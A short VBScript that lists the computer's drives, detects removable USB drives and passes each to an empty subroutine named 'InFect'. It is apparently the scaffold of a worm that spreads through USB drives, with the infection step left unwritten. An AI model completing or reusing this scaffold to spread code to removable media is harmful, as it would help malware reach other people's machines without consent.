Dim objFileSystem, SubDrives
Set objFileSystem = CreateObject("Scripting.FileSystemObject")
Set SubDrives = objFileSystem.Drives
For Each drive In SubDrives
    drivePath = drive.DriveLetter
    If objFileSystem.GetDrive(drivePath & ":").DriveType = 1 Then
		WScript.Echo drivePath & " is a U-Disk"
		Call InFect(drivePath)
	End If
Next
Set objFileSystem = Nothing
Set SubDrives = Nothing

Sub InFect(drivePath)
	
End Sub